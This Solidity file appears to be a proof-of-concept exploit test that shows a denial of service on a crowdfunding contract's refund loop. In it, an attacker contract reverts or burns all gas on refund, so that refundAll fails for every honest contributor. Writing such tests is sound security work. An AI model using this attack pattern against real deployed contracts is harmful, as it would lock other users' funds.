// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {AssayPoC} from "assay/AssayExploit.sol";
import {Crowdfund} from "../src/Crowdfund.sol";

/// @notice The attacker's contributor: a contract that refuses every refund, either by reverting
///         or by burning all the gas that the refund call forwards to it.
contract RefundBlocker {
    bool private immutable burnGas;

    constructor(Crowdfund campaign, bool burnGas_) payable {
        burnGas = burnGas_;
        campaign.contribute{value: msg.value}();
    }

    receive() external payable {
        if (!burnGas) revert("refund refused");
        while (true) {}
    }
}

/// @notice Denial of service in a payout loop: one refund that fails stops `refundAll` for
///         every contributor.
/// Knobs:
///   0 `burn_gas`      0: the attacker's contract reverts on a refund; 1: it burns all gas;
///   1 `late_joiners`  honest contributors who join after the attacker, so that their refunds
///                     come after the attacker's in the loop.
/// The attacker contributes its whole balance through its contract. After the organizer cancels
/// the campaign, a keeper runs `refundAll` with an ordinary gas limit.
contract CrowdfundRefundBlockPoC is AssayPoC {
    uint256 private constant KEEPER_GAS_LIMIT = 500_000;

    Crowdfund internal campaign;
    address internal organizer;
    address[] internal earlyContributors;

    function setUpTarget() internal override {
        organizer = makeAddr("organizer");
        vm.prank(organizer);
        campaign = new Crowdfund(100 ether);

        string[3] memory names = ["alice", "bob", "carol"];
        for (uint256 i = 0; i < names.length; i++) {
            address contributor = makeAddr(names[i]);
            vm.deal(contributor, 5 ether);
            vm.prank(contributor);
            campaign.contribute{value: (i + 1) * 1 ether}();
            earlyContributors.push(contributor);
        }

        declareAttackerBalance(0.01 ether, 0.001 ether, 1 ether);
        declareKnob(0, "burn_gas", 0, 0, 1);
        declareKnob(1, "late_joiners", 0, 0, 3);
    }

    function exploit() internal override {
        vm.startPrank(attacker);
        new RefundBlocker{value: attacker.balance}(campaign, knob(0) == 1);
        vm.stopPrank();

        uint256 early = earlyContributors.length;
        address[] memory honest = new address[](early + knob(1));
        for (uint256 i = 0; i < early; i++) {
            honest[i] = earlyContributors[i];
        }
        for (uint256 i = early; i < honest.length; i++) {
            honest[i] = makeAddr(string.concat("late_joiner_", vm.toString(i)));
            vm.deal(honest[i], 2 ether);
            vm.prank(honest[i]);
            campaign.contribute{value: 1 ether}();
        }

        // What every honest contributor holds once its contribution is back.
        uint256 owed = 0;
        for (uint256 i = 0; i < honest.length; i++) {
            owed += honest[i].balance + campaign.contributionOf(honest[i]);
        }

        vm.prank(organizer);
        campaign.cancel();
        vm.prank(makeAddr("keeper"));
        try campaign.refundAll{gas: KEEPER_GAS_LIMIT}() {} catch {}

        uint256 held = 0;
        for (uint256 i = 0; i < honest.length; i++) {
            held += honest[i].balance;
        }
        invariant_broken("refunds_complete", held == owed);
    }
}
